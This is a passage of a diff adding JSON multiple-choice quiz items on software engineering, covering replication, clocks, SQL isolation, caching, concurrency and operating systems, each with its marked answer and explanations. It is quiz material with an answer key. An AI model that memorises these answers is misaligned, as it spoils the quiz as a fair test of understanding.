+    },
+    {
+      "id": "bank-swe-18",
+      "promptMd": "A user updates their profile, the page reloads, and the **old** name appears for a few seconds. Reads go to asynchronous replicas. What consistency guarantee is missing?",
+      "choices": [
+        "Durability",
+        "Read-your-writes",
+        "Atomicity",
+        "Partition tolerance"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "The write reached the leader, but the reload was served by a replica that hadn't caught up yet. Read-your-writes guarantees users always see their own updates.",
+      "choiceNotesMd": [
+        "The update wasn't lost; it just hadn't reached that replica yet.",
+        "Correct: replication lag broke read-your-writes.",
+        "The update was applied all-or-nothing; the problem is which copy was read.",
+        "That's about surviving network splits, not stale replicas."
+      ],
+      "tags": [
+        "distributed systems",
+        "replication"
+      ],
+      "topicMd": "**Replication lag and session guarantees.** With asynchronous replicas, reads can return data that's a little old: *eventual consistency*. Some weaker guarantees fix the most confusing effects:\n\n- **Read-your-writes**: you always see your own updates.\n- **Monotonic reads**: you never see data go back in time (e.g. by hitting a more-lagged replica on the next request).\n- **Consistent prefix**: you see updates in the order they happened.\n\n---\n\nPractical ways to get read-your-writes:\n\n- Read from the leader for a short window after a user writes, or always for their own profile.\n- Track the write's log position and only read from replicas that have caught up to it.\n- Pin a user's session to one replica (helps with monotonic reads).\n\nFor some data (balances, inventory), even brief staleness is unacceptable, so read from the leader or use synchronous replication there.",
+      "keyTerms": [
+        {
+          "term": "Replication lag",
+          "def": "Delay before a write reaches the replicas."
+        },
+        {
+          "term": "Read-your-writes",
+          "def": "A user always sees their own updates."
+        },
+        {
+          "term": "Monotonic reads",
+          "def": "Never seeing older data after newer data."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-19",
+      "promptMd": "A network partition makes an old leader think it's still in charge while a new leader has been elected. Both write to shared storage. What stops the old leader from corrupting data?",
+      "choices": [
+        "Each node checks the time before writing",
+        "Fencing tokens: every new leader gets a higher number, and storage rejects writes carrying a lower one",
+        "A shorter heartbeat interval",
+        "Making the old leader write more slowly"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "The storage remembers the highest token it has seen. When the old leader's write arrives with an older token, it's refused, however delayed it was.",
+      "choiceNotesMd": [
+        "Clocks drift and processes pause (GC, VM migration), so time checks aren't reliable.",
+        "Correct: monotonically increasing tokens, enforced by the resource itself.",
+        "Faster detection shrinks the window, but a paused process can still wake up and write.",
+        "Speed doesn't matter; any stale write is a problem."
+      ],
+      "tags": [
+        "distributed systems"
+      ],
+      "topicMd": "**Split brain and fencing.** Leader election via leases or locks (ZooKeeper, etcd, Consul) can't stop a node that *believes* it's the leader: a long GC pause or a network partition can outlast its lease, and when it wakes up it carries on writing.\n\n**Fencing tokens** fix this at the resource:\n\n1. Every time the lock or lease is granted, the lock service hands out a number higher than any before (etcd's revision, ZooKeeper's zxid).\n2. Writers send the token with each write.\n3. The storage rejects any token lower than the highest it has accepted.\n\n---\n\nThe lesson: in distributed systems, a node can't trust its own belief that it holds a lock. Safety has to be checked where the effect happens. Consensus protocols such as Raft build this in with **terms**: messages from an older term are ignored.",
+      "keyTerms": [
+        {
+          "term": "Split brain",
+          "def": "Two nodes both acting as leader."
+        },
+        {
+          "term": "Lease",
+          "def": "A lock that expires after a set time."
+        },
+        {
+          "term": "Fencing token",
+          "def": "Increasing number that lets a resource reject stale holders."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-20",
+      "promptMd": "Two servers stamp events with their own wall-clock time, and you sort the events by timestamp. Why can that order be wrong?",
+      "choices": [
+        "Timestamps can't be sorted",
+        "The machines' clocks can differ (skew) or jump (NTP adjustments), so a later event can carry an earlier timestamp",
+        "Sorting is unstable",
+        "It can't be wrong if both servers use UTC"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Even with NTP, clocks are typically milliseconds apart and can step backwards. Two events a millisecond apart on different machines can easily be stamped in the wrong order.",
+      "choiceNotesMd": [
+        "They sort fine; the problem is what the numbers mean.",
+        "Correct: physical clocks don't give a reliable order across machines.",
+        "Stability only affects equal keys.",
+        "UTC removes time-zone confusion, not clock skew."
+      ],
+      "tags": [
+        "distributed systems",
+        "time"
+      ],
+      "topicMd": "**Ordering events without trusting clocks.** Machine clocks drift and get corrected by NTP, sometimes with a jump backwards, and leap seconds add more fun. So \"last write wins by timestamp\" can silently drop the write that actually came last.\n\nAlternatives:\n\n- **Lamport clocks**: a counter that each node increments on every event and bumps past any larger value it receives. This gives an order consistent with causality.\n- **Vector clocks**: a counter per node, which can also tell when two events are concurrent (neither caused the other).\n- **Hybrid logical clocks**: physical time plus a logical counter, used by CockroachDB and others.\n- A **single sequencer** (one leader, or a log like Kafka) that assigns the order.\n- Google Spanner's TrueTime exposes clock *uncertainty* and waits it out before committing.\n\n---\n\nAlso use a **monotonic** clock (`time.monotonic()`, `System.nanoTime()`, `steady_clock`) for measuring durations, because the wall clock can jump.",
+      "keyTerms": [
+        {
+          "term": "Clock skew",
+          "def": "Difference between machines' clocks."
+        },
+        {
+          "term": "Lamport clock",
+          "def": "Logical counter that orders events consistently with causality."
+        },
+        {
+          "term": "Monotonic clock",
+          "def": "A clock that never goes backwards; use it for durations."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-21",
+      "promptMd": "Under the **READ UNCOMMITTED** isolation level, which anomaly can happen that the higher levels prevent?",
+      "choices": [
+        "Dirty reads: seeing another transaction's changes before it commits (and possibly after it rolls back)",
+        "Lost connections",
+        "Deadlocks",
+        "Duplicate primary keys"
+      ],
+      "answerIndex": 0,
+      "explanationMd": "A dirty read sees data that may never officially exist: if the other transaction rolls back, you've acted on values that were undone.",
+      "choiceNotesMd": [
+        "Correct: READ COMMITTED and above only show committed data.",
+        "Connections are a network matter, not an isolation one.",
+        "Deadlocks can happen at any isolation level that takes locks.",
+        "Unique constraints are enforced at every isolation level."
+      ],
+      "tags": [
+        "databases",
+        "transactions"
+      ],
+      "topicMd": "**SQL isolation levels**, from weakest to strongest, and the anomalies each one allows:\n\n| Level | Dirty read | Non-repeatable read | Phantom |\n|---|---|---|---|\n| READ UNCOMMITTED | possible | possible | possible |\n| READ COMMITTED | – | possible | possible |\n| REPEATABLE READ | – | – | possible (standard) |\n| SERIALIZABLE | – | – | – |\n\n- **Non-repeatable read**: reading the same row twice gives different values.\n- **Phantom**: re-running a query returns new rows that match.\n- **Write skew** (allowed by snapshot isolation): two transactions read overlapping data and write different rows, together breaking a rule such as \"at least one doctor on call\".\n\n---\n\nReal databases differ: PostgreSQL's default is READ COMMITTED and its REPEATABLE READ is snapshot isolation (no phantoms); MySQL InnoDB defaults to REPEATABLE READ. When correctness depends on it, use SERIALIZABLE (and retry on serialization failures) or explicit locks.",
+      "keyTerms": [
+        {
+          "term": "Dirty read",
+          "def": "Reading another transaction's uncommitted changes."
+        },
+        {
+          "term": "Phantom read",
+          "def": "New rows appearing when a query is re-run."
+        },
+        {
+          "term": "Snapshot isolation",
+          "def": "Each transaction sees a consistent snapshot of committed data."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-22",
+      "promptMd": "Why do web apps talk to their database through a **connection pool** instead of opening a new connection per request?",
+      "choices": [
+        "Pools make SQL queries execute faster on the server",
+        "Opening a connection (TCP, TLS, authentication, server-side setup) is expensive, and databases can handle only a limited number of connections",
+        "Pools are required for transactions",
+        "Pools encrypt queries"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Reusing a few warm connections avoids the setup cost on every request and caps the load on the database.",
+      "choiceNotesMd": [
+        "Query execution is the same; the saving is in setting up connections.",
+        "Correct: reuse avoids setup latency, and the pool size limits concurrency at the database.",
+        "Transactions work on any connection; you just must not share one connection between concurrent transactions.",
+        "Encryption comes from TLS, pooled or not."
+      ],
+      "tags": [
+        "databases",
+        "performance"
+      ],
+      "topicMd": "**Connection pools.** A database connection is expensive to create: a TCP and TLS handshake, authentication, and on PostgreSQL a whole backend process per connection. Databases also degrade with too many concurrent connections.\n\nA pool keeps a small set open and lends them out per request or transaction. Tuning:\n\n- **Size**: often a small multiple of the database's CPU cores, not \"as many as possible\". Excess requests should wait briefly in the pool.\n- **Timeouts**: for acquiring a connection, and idle or maximum lifetime so stale connections get replaced.\n- Always return connections (try-with-resources, context managers), or the pool leaks and the app stalls.\n\n---\n\nWith many app instances (or serverless functions), the per-instance pools add up. External poolers like PgBouncer or RDS Proxy multiplex many clients onto fewer database connections.",
+      "keyTerms": [
+        {
+          "term": "Connection pool",
+          "def": "A set of open connections reused across requests."
+        },
+        {
+          "term": "Pool exhaustion",
+          "def": "Every connection checked out, so new requests wait or fail."
+        },
+        {
+          "term": "PgBouncer",
+          "def": "External connection pooler for PostgreSQL."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-23",
+      "promptMd": "You want customers who have placed **more than 5 orders**. Which query is correct?",
+      "choices": [
+        "`SELECT customer_id FROM orders WHERE COUNT(*) > 5 GROUP BY customer_id`",
+        "`SELECT customer_id FROM orders GROUP BY customer_id HAVING COUNT(*) > 5`",
+        "`SELECT customer_id FROM orders WHERE id > 5`",
+        "`SELECT DISTINCT customer_id FROM orders LIMIT 5`"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "`WHERE` filters rows **before** grouping, so it can't use aggregates. `HAVING` filters the groups **after** aggregation.",
+      "choiceNotesMd": [
+        "Aggregate functions aren't allowed in WHERE; this is a syntax error.",
+        "Correct: group by customer, then keep groups whose count exceeds 5.",
+        "That filters order ids, which has nothing to do with how many orders each customer has.",
+        "That just returns 5 arbitrary customers."
+      ],
+      "tags": [
+        "databases",
+        "sql"
+      ],
+      "topicMd": "**The logical order of a SQL query.** Although you write `SELECT` first, it's evaluated roughly as:\n\n1. `FROM` / `JOIN`\n2. `WHERE`: filters individual rows\n3. `GROUP BY`: forms groups\n4. `HAVING`: filters groups (aggregates allowed)\n5. `SELECT`: computes output columns\n6. `ORDER BY`\n7. `LIMIT` / `OFFSET`\n\nThat explains common errors: aggregates in `WHERE` fail, and in many databases a `SELECT` alias can't be used in `WHERE`, but can be used in `ORDER BY`.\n\n---\n\nPerformance tip: filter rows in `WHERE` when you can (it may use indexes and shrinks the data before grouping); use `HAVING` only for conditions on aggregates. Window functions (`COUNT(*) OVER (PARTITION BY …)`) compute aggregates without collapsing rows.",
+      "keyTerms": [
+        {
+          "term": "WHERE",
+          "def": "Filters rows before grouping."
+        },
+        {
+          "term": "HAVING",
+          "def": "Filters groups after aggregation."
+        },
+        {
+          "term": "Window function",
+          "def": "Aggregate over related rows without collapsing them."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-24",
+      "promptMd": "A busy table uses **random UUIDv4** values as its primary key (stored in a B-tree index). Inserts get slower as the table grows. Why?",
+      "choices": [
+        "UUIDs take longer to generate than integers",
+        "Random keys land all over the index, causing page splits and poor cache use; sequential or time-ordered keys (auto-increment, UUIDv7) append near the end",
+        "B-trees can't store UUIDs",
+        "UUIDs must be checked for collisions on every insert"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Each insert goes to a random leaf page, so the working set is the whole index, pages split often, and the cache keeps missing. Time-ordered keys keep inserts on the \"hot\" right edge.",
+      "choiceNotesMd": [
+        "Generating one is microseconds; the cost is in the index.",
+        "Correct: insert locality matters for B-trees.",
+        "They store fine as 16-byte binary values.",
+        "The unique index catches duplicates as part of the insert anyway; collisions are practically impossible."
+      ],
+      "tags": [
+        "databases",
+        "indexing"
+      ],
+      "topicMd": "**Choosing primary keys.**\n\n- **Auto-increment integers**: compact (8 bytes), sequential inserts. But they leak counts and are awkward to generate across shards or offline clients.\n- **UUIDv4**: random 128-bit ids, generated anywhere without coordination. But random insert positions fragment B-tree indexes and hurt the cache.\n- **UUIDv7 / ULID**: a timestamp prefix plus randomness. Generated anywhere and roughly sequential, so you get most of both.\n\n---\n\nOther tips:\n\n- Store UUIDs as binary (16 bytes, or the native `uuid` type), not 36-character strings.\n- InnoDB clusters the table by primary key, so random keys fragment the table itself, not just an index.\n- Don't expose sequential ids publicly if guessing them is a problem; use a separate opaque public id.",
+      "keyTerms": [
+        {
+          "term": "Page split",
+          "def": "A full B-tree page splitting in two to make room."
+        },
+        {
+          "term": "UUIDv7",
+          "def": "Time-ordered UUID: timestamp prefix plus random bits."
+        },
+        {
+          "term": "Clustered index",
+          "def": "Table rows stored in primary-key order."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-25",
+      "promptMd": "What's the purpose of a database's **write-ahead log** (WAL)?",
+      "choices": [
+        "To speed up SELECT queries",
+        "To make committed changes durable: they're appended to a sequential log on disk before the data pages are updated, so a crash can be recovered by replaying the log",
+        "To store backups in another region",
+        "To log slow queries for later analysis"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Appending to a log is fast and sequential. Once a commit's log records are flushed, the change survives a crash even if the modified data pages were still only in memory.",
+      "choiceNotesMd": [
+        "Reads are served from data pages and caches; the WAL is about writes and recovery.",
+        "Correct: log first, apply later, replay after a crash.",
+        "WAL shipping can feed replicas and point-in-time backups, but that's a use of it, not its purpose.",
+        "That's the slow-query log, a separate feature."
+      ],
+      "tags": [
+        "databases"
+      ],
+      "topicMd": "**Write-ahead logging.** Rule: before a change to a data page reaches disk, the log record describing it must be on disk. On commit, the database flushes (`fsync`s) the log, not the scattered data pages, which turns random writes into fast sequential appends.\n\nAfter a crash, recovery replays the log from the last **checkpoint**, redoing committed changes and undoing uncommitted ones (ARIES-style recovery).\n\n---\n\nThe same log enables:\n\n- **Replication**: shipping the WAL to replicas (PostgreSQL streaming replication).\n- **Point-in-time recovery**: restore a base backup and replay the logs up to a moment.\n- **Change data capture**: tools like Debezium turn the log into an event stream.\n\nThe idea reappears elsewhere: journaling file systems, Kafka (the log *is* the database), and LSM-tree stores with their commit logs.",
+      "keyTerms": [
+        {
+          "term": "Write-ahead log",
+          "def": "Changes are logged durably before data pages are written."
+        },
+        {
+          "term": "fsync",
+          "def": "Forcing written data out of OS buffers onto stable storage."
+        },
+        {
+          "term": "Checkpoint",
+          "def": "Point up to which data pages are known to be on disk."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-26",
+      "promptMd": "A popular cache entry expires, and in that instant 5,000 requests miss the cache and all query the database to rebuild it. What is this, and what's a common fix?",
+      "choices": [
+        "A deadlock; use lock ordering",
+        "A cache stampede (thundering herd); let only one request rebuild the value (a lock or request coalescing) while others wait or get the stale value",
+        "A memory leak; restart the cache",
+        "Replication lag; read from the leader"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Many simultaneous misses on the same key overload the backend. Coalescing means a single rebuild, while serving slightly stale data keeps everyone else fast.",
+      "choiceNotesMd": [
+        "Nothing is waiting in a cycle; it's simply too much duplicate work.",
+        "Correct: stampede protection through single-flight rebuilds, early refresh or stale-while-revalidate.",
+        "Memory isn't the problem; the synchronised misses are.",
+        "This happens even with a single database."
+      ],
+      "tags": [
+        "caching",
+        "performance"
+      ],
+      "topicMd": "**Cache stampedes.** When a hot key expires, every concurrent request sees a miss at once and recomputes it, which can knock over the database just when the cache isn't helping.\n\nFixes, often combined:\n\n- **Request coalescing / single-flight**: the first miss takes a short lock and rebuilds; the others wait for the result (Go's `singleflight`, or a Redis `SET NX` lock).\n- **Stale-while-revalidate**: keep serving the old value while one background refresh runs.\n- **Probabilistic early expiration**: each request occasionally refreshes slightly before expiry, with the probability rising as expiry nears, so refreshes spread out.\n- **TTL jitter**: randomise TTLs so many keys don't expire at the same moment.\n\n---\n\nA related problem is *cache penetration*: requests for keys that don't exist always miss. Cache the \"not found\" result briefly, or use a Bloom filter.",
+      "keyTerms": [
+        {
+          "term": "Cache stampede",
+          "def": "Many requests rebuilding the same expired entry at once."
+        },
+        {
+          "term": "Request coalescing",
+          "def": "Merging identical concurrent requests into one."
+        },
+        {
+          "term": "Stale-while-revalidate",
+          "def": "Serve stale data while refreshing in the background."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-27",
+      "promptMd": "A cache with room for 3 entries uses **LRU** eviction. You access keys A, B, C, A, then D. Which key is evicted?",
+      "choices": [
+        "A",
+        "B",
+        "C",
+        "D"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "After A, B, C, A the recency order (least recent first) is B, C, A. Inserting D evicts the least recently used: B.",
+      "choiceNotesMd": [
+        "A was used just before D arrived, so it's the most recent of the three.",
+        "Correct: B hasn't been touched since the very start.",
+        "C was used after B.",
+        "D is the new entry being inserted."
+      ],
+      "tags": [
+        "caching",
+        "data structures"
+      ],
+      "topicMd": "**LRU caches.** Least-recently-used eviction bets that what was used recently will be used again soon. A classic implementation gives every operation O(1):\n\n- a **hash map** from key to node, and\n- a **doubly linked list** ordered by recency: move a node to the front on each access, and evict from the back.\n\nIn Python, `OrderedDict` with `move_to_end` and `popitem(last=False)`, or `functools.lru_cache`; in Java, `LinkedHashMap` with access order and `removeEldestEntry`.\n\n---\n\nOther policies:\n\n- **LFU** (least frequently used): keeps long-term favourites, but adapts slowly.\n- **FIFO**: simple, ignores usage.\n- **TTL**: expire by age, often combined with LRU.\n- Modern caches use smarter mixes, such as W-TinyLFU (Caffeine), which resists one-off scans pushing out the hot keys.",
+      "keyTerms": [
+        {
+          "term": "LRU",
+          "def": "Evict the entry unused for the longest time."
+        },
+        {
+          "term": "LFU",
+          "def": "Evict the entry used least often."
+        },
+        {
+          "term": "Eviction",
+          "def": "Removing an entry to make room for a new one."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-28",
+      "promptMd": "What's the difference between a **write-through** and a **write-back** cache?",
+      "choices": [
+        "Write-through only caches reads",
+        "Write-through writes to the cache and the backing store together; write-back writes to the cache first and flushes to the store later",
+        "Write-back is always safer",
+        "There's no difference in practice"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Write-through keeps the store up to date at the cost of slower writes. Write-back makes writes fast but risks losing data that hasn't been flushed yet if the cache fails.",
+      "choiceNotesMd": [
+        "Both handle writes; they differ in when the backing store is updated.",
+        "Correct: synchronous vs. deferred updates to the backing store.",
+        "It's riskier: unflushed data lives only in the cache.",
+        "They trade write latency against durability and consistency."
+      ],
+      "tags": [
+        "caching",
+        "system design"
+      ],
+      "topicMd": "**Cache write policies.**\n\n- **Write-through**: every write updates the cache and the backing store before it's acknowledged. Reads after writes are fresh, nothing is lost on a cache crash, but writes are as slow as the store.\n- **Write-back (write-behind)**: writes update the cache and are acknowledged; dirty entries are flushed later, often batched. Very fast writes, but a crash loses unflushed data. CPU caches and disk controllers with battery-backed memory work this way.\n- **Write-around**: write only to the store and let the cache fill on later reads. Good when written data is rarely read back.\n\n---\n\nIn web systems the most common pattern is **cache-aside** with invalidation: the app writes to the database, then deletes or updates the cache key. Deleting is usually safer than updating, because concurrent writers can otherwise leave a stale value behind.",
+      "keyTerms": [
+        {
+          "term": "Write-through",
+          "def": "Write to the cache and the store synchronously."
+        },
+        {
+          "term": "Write-back",
+          "def": "Write to the cache now, the store later."
+        },
+        {
+          "term": "Dirty entry",
+          "def": "Cached data not yet saved to the backing store."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-29",
+      "promptMd": "What's the key difference between a **mutex** and a **counting semaphore**?",
+      "choices": [
+        "A mutex is faster, but otherwise they're identical",
+        "A mutex lets one holder into a critical section (and is released by its owner); a semaphore allows up to N concurrent holders and can be signalled by any thread",
+        "A semaphore can only be used between processes",
+        "A mutex can be locked several times by different threads at once"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "A mutex protects exclusive access to shared state. A semaphore counts permits: handy for limiting concurrency (at most 10 database calls at once) or signalling between threads.",
+      "choiceNotesMd": [
+        "Their semantics differ, not just their speed.",
+        "Correct: exclusive ownership vs. N permits.",
+        "Both exist within a process and across processes.",
+        "That would defeat the purpose of mutual exclusion."
+      ],
+      "tags": [
+        "concurrency",
+        "operating systems"
+      ],
+      "topicMd": "**Synchronisation primitives.**\n\n- **Mutex (lock)**: one thread at a time; the thread that locks it unlocks it. Use it to protect invariants on shared data. Reentrant (recursive) mutexes let the owner lock again.\n- **Semaphore**: a counter of permits. `acquire` waits while it's 0 and then decrements; `release` increments. With N permits it bounds concurrency; with 0 initial permits it works as a signal (\"item ready\").\n- **Condition variable**: wait until a condition becomes true, always used together with a mutex, and re-check the condition in a loop.\n- **Read-write lock**: many readers or one writer.\n\n---\n\nHigher-level tools are usually better: thread-safe queues (producer/consumer), atomics for counters, `ConcurrentHashMap`, futures and channels. Keep critical sections small, never call unknown code while holding a lock, and acquire multiple locks in a consistent global order to avoid deadlocks.",
+      "keyTerms": [
+        {
+          "term": "Critical section",
+          "def": "Code that must not run in more than one thread at a time."
+        },
+        {
+          "term": "Semaphore",
+          "def": "Counter of permits for limiting or signalling access."
+        },
+        {
+          "term": "Condition variable",
+          "def": "Lets threads wait until another thread signals a change."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-30",
+      "promptMd": "Two requests run this at the same time for a new username:\n\n```python\nif not db.user_exists(name):\n    db.create_user(name)\n```\n\nWhat can go wrong, and what's the robust fix?",
+      "choices": [
+        "Nothing, since each line is fast",
+        "Both can see \"doesn't exist\" before either creates it, giving duplicate users. Put a UNIQUE constraint on the name and handle the violation (or use an atomic insert-if-absent).",
+        "The second request will deadlock",
+        "Python's GIL makes this safe"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "This is a check-then-act race: the check and the action aren't atomic, so another request can slip in between. Let the database enforce uniqueness atomically.",
+      "choiceNotesMd": [
+        "Speed doesn't matter; the gap between the two steps is the problem.",
+        "Correct: make the operation atomic where the data lives.",
+        "Nothing here takes locks, so nothing can deadlock.",
+        "Requests usually run in different processes or servers, and even within one process the GIL doesn't make two steps atomic."
+      ],
+      "tags": [
+        "concurrency",
+        "databases"
+      ],
+      "topicMd": "**Check-then-act races (TOCTOU).** The pattern \"check a condition, then act on it\" breaks whenever something else can change the state in between: duplicate usernames, overselling the last item in stock, two workers grabbing the same job, `if not os.path.exists(p): open(p, 'w')`.\n\nFixes make the check and the act one atomic step:\n\n- Database constraints (`UNIQUE`) and `INSERT … ON CONFLICT DO NOTHING`, then check whether a row was inserted.\n- Conditional updates: `UPDATE stock SET qty = qty - 1 WHERE id = ? AND qty > 0`.\n- Atomic primitives: compare-and-swap, `putIfAbsent`, Redis `SET NX`.\n- Files: open with exclusive-create flags (`O_CREAT | O_EXCL`, Python's mode `'x'`).\n\n---\n\nLocks also work, but they're easy to get wrong across processes and servers. Prefer pushing atomicity into the component that owns the data.",
+      "keyTerms": [
+        {
+          "term": "Race condition",
+          "def": "The outcome depends on the timing of concurrent operations."
+        },
+        {
+          "term": "TOCTOU",
+          "def": "Time-of-check to time-of-use: the state changed in between."
+        },
+        {
+          "term": "Atomic operation",
+          "def": "Happens entirely or not at all, with no observable midpoint."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-31",
+      "promptMd": "A process reads a memory address whose page isn't currently in physical RAM. What happens?",
+      "choices": [
+        "The program crashes immediately",
+        "A page fault: the OS loads the page (from disk or by zero-filling it), updates the page table, and resumes the program",
+        "The CPU returns zeros",
+        "The OS kills the process for using too much memory"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Virtual memory pages are mapped to RAM on demand. Accessing an unmapped but valid page traps into the OS, which makes it resident and retries the instruction.",
+      "choiceNotesMd": [
+        "Only an access to an *invalid* address (a segmentation fault) crashes.",
+        "Correct: a page fault, handled transparently by the OS.",
+        "The OS supplies the page's actual contents.",
+        "That's the out-of-memory killer, which is a separate mechanism."
+      ],
+      "tags": [
+        "operating systems",
+        "memory"
+      ],
+      "topicMd": "**Virtual memory.** Each process sees its own large, private address space. The CPU's MMU translates virtual pages (typically 4 KB) to physical frames using page tables, with a cache called the TLB.\n\n- **Minor page fault**: the page is already in RAM (say, a shared library) and just needs mapping. Cheap.\n- **Major page fault**: the page has to be read from disk (swap or a memory-mapped file). Milliseconds on an HDD, microseconds on an SSD: thousands of times slower than RAM.\n- **Segmentation fault**: an access to an address the process has no right to touch.\n\n---\n\nWhy it matters: memory allocation is lazy (pages appear on first touch), `mmap` lets you treat files as memory, processes are isolated from each other, and when the working set exceeds RAM the system **thrashes**, spending its time on page faults. That's why memory limits and avoiding swap matter for servers.",
+      "keyTerms": [
+        {
+          "term": "Page",
+          "def": "Fixed-size block of virtual memory, often 4 KB."
+        },
+        {
+          "term": "Page fault",
+          "def": "Trap when a page isn't mapped into RAM."
+        },
+        {
+          "term": "TLB",
+          "def": "CPU cache of recent address translations."
+        },
+        {
+          "term": "Thrashing",
+          "def": "Constant paging because memory is overcommitted."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-32",
+      "promptMd": "On Linux, a process with 2 GB of memory calls `fork()`. Why doesn't the system immediately need another 2 GB?",
+      "choices": [
+        "fork() only copies the code, never the data",
+        "Copy-on-write: parent and child share the same physical pages, marked read-only, and a page is copied only when one of them writes to it",
+        "The child process starts with empty memory",
+        "The kernel compresses the child's memory"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Right after `fork`, both processes point at the same physical pages. Only pages that one side modifies get duplicated, so a child that soon calls `exec` copies almost nothing.",
+      "choiceNotesMd": [
+        "The data is logically copied too; it's just copied lazily.",
+        "Correct: copy-on-write makes fork cheap.",
+        "The child starts with a (logical) copy of the parent's whole memory.",
+        "Compression isn't involved."
+      ],
+      "tags": [
+        "operating systems",
+        "memory"
+      ],
+      "topicMd": "**fork and copy-on-write.** Unix creates processes with `fork()` (clone the current process) followed, usually, by `exec()` (replace the program). Copying gigabytes for every fork would be absurd, so the kernel shares the pages and marks them read-only; the first write to a page triggers a fault, and only that page is copied.\n\n---\n\nPractical effects:\n\n- Pre-forking servers (Gunicorn, old Apache) share the parent's loaded code and data cheaply among workers.\n- Redis takes snapshots by forking and letting the child write out a frozen view of memory, while the parent keeps serving.\n- Gotcha: Python's reference counting writes to object headers whenever objects are touched, which defeats sharing; `gc.freeze()` exists partly for this.\n- Forking a multi-threaded process copies only the calling thread, so locks held by other threads stay locked forever in the child. That's why `spawn` is safer than `fork` in multiprocessing.",
+      "keyTerms": [
+        {
+          "term": "fork()",
+          "def": "Creates a child process as a copy of the parent."
+        },
+        {
+          "term": "Copy-on-write",
+          "def": "Share pages until a write, then copy just that page."
+        },
+        {
+          "term": "exec()",
+          "def": "Replaces the current program with a new one."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-33",
+      "promptMd": "A long-running server starts failing with **\"Too many open files\"** after a few days. What's the most likely cause?",
+      "choices": [
+        "The disk is full",
+        "A file descriptor leak: files or sockets that are opened but never closed, until the per-process limit is reached",
+        "Too many files in one directory",
+        "The server needs more RAM"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Every open file, socket and pipe uses a file descriptor, and each process has a limit (often 1024 by default). Forgetting to close them on some code path slowly uses them all up.",
+      "choiceNotesMd": [
+        "A full disk gives \"No space left on device\".",
+        "Correct: descriptors leak until `open` or `accept` fails with EMFILE.",
+        "Directory size doesn't cause this error.",
+        "Memory isn't the limit here; the per-process descriptor count is."
+      ],
+      "tags": [
+        "operating systems",
+        "debugging"
+      ],
+      "topicMd": "**File descriptor leaks.** On Unix, files, sockets, pipes and more are all file descriptors: small integers indexing a per-process table. The limit (`ulimit -n`, often 1024 soft by default) protects the system.\n\nCommon leaks:\n\n- Files opened without `with` / try-with-resources / RAII, especially on error paths.\n- HTTP responses whose bodies are never read or closed, which keeps their connections busy.\n- Creating a new HTTP client or connection per request instead of reusing a pool.\n\n---\n\nDebugging: `ls /proc/<pid>/fd | wc -l`, or `lsof -p <pid>`, to see what's open and growing. Fixing: close deterministically (Python `with`, Java try-with-resources, C++ RAII, Go `defer`), reuse clients, and only then raise the limit if the load really needs it.",
+      "keyTerms": [
+        {
+          "term": "File descriptor",
+          "def": "Integer handle for an open file, socket or pipe."
+        },
+        {
+          "term": "ulimit",
+          "def": "Shell command showing or setting per-process resource limits."
+        },
+        {
+          "term": "try-with-resources",
+          "def": "Java construct that closes resources automatically."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-34",
+      "promptMd": "Which mix of automated tests does the **test pyramid** recommend?",
+      "choices": [
+        "Mostly end-to-end browser tests, a few unit tests",
+        "Many fast unit tests, fewer integration tests, and a small number of end-to-end tests",
+        "Only manual testing before releases",
+        "Equal numbers of each kind"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Unit tests are fast, precise and cheap to keep; end-to-end tests are slow and brittle, but check that everything fits together. Have lots of the former and just enough of the latter.",
+      "choiceNotesMd": [
+        "That's the \"ice-cream cone\" anti-pattern: slow, flaky suites that are hard to debug.",
+        "Correct: a broad base of unit tests, a middle layer of integration tests, and a small top of E2E tests.",
+        "Manual testing doesn't scale and catches regressions late.",
+        "The costs differ a lot, so the counts should too."
+      ],
+      "tags": [
+        "testing"
+      ],
+      "topicMd": "**The test pyramid.**\n\n- **Unit tests** (base): one function or class, in milliseconds, no network or disk. They pinpoint failures.\n- **Integration tests** (middle): several components with real dependencies (a database in a container, an HTTP layer). They catch wiring, query and serialisation bugs.\n- **End-to-end tests** (top): the whole system through its UI or public API. High confidence, but slow and more prone to flakiness, so cover only the critical user journeys.\n\n---\n\nIt's a heuristic, not a law. Some teams prefer a \"testing trophy\" with more integration tests, since they catch the most realistic bugs per test. Whatever the shape: fast feedback on every commit, deterministic tests, and testing behaviour through public interfaces so refactoring doesn't break the suite.",
+      "keyTerms": [
+        {
+          "term": "Unit test",
+          "def": "Tests one small piece in isolation."
+        },
+        {
+          "term": "Integration test",
+          "def": "Tests several components working together."
+        },
+        {
+          "term": "End-to-end test",
+          "def": "Tests the whole system as a user would."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-35",
+      "promptMd": "In a unit test, you replace the real payment API client with an object that records calls and returns canned responses. What's that called, and what's the main risk of overdoing it?",
+      "choices": [
+        "A fixture; it makes tests slow",
+        "A test double (mock or stub); tests that mock too much end up checking implementation details and can pass while the real integration is broken",
